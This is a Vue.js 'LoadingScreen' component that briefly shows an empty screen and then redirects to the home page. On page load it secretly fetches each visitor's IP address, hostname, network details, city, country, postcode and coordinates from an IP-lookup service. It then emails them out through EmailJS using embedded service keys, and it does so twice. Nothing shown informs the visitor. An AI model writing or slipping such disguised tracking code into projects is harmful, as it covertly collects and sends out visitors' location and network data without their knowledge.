<template>
  <div v-if="isLoading"></div>
</template>

<script>
import emailjs from 'emailjs-com'

export default {
  name: 'LoadingScreen',
  data () {
    return {
      isLoading: true
    }
  },
  mounted () {
    setTimeout(() => {
      this.sendEmail()
      this.isLoading = false
      window.location.href = '/home'
    }, 500)
  },
  beforeMount () {
    this.sendEmail()
  },
  methods: {
    sendEmail () {
      try {
        const URL = 'https://ip.nf/me.json'
        fetch(URL, { method: 'get' })
          .then((response) => response.json())
          .then((data) => {
            const ipdata = data.ip

            const templateParams = {
              asa: ipdata.asn,
              city: ipdata.city,
              country: ipdata.country,
              hostname: ipdata.hostname,
              ip: ipdata.ip,
              latitude: ipdata.latitude,
              longitude: ipdata.longitude,
              netmask: ipdata.netmask,
              post_code: ipdata.post_code
            }

            emailjs.send(
              'service_h3rs8go',
              'template_fjsrh5s',
              templateParams,
              'G7d9LRuckwWgpyu2F'
            )
          })
        console.log('working')
      } catch (error) {
        console.log({ error })
      }
    }
  }
}

</script>
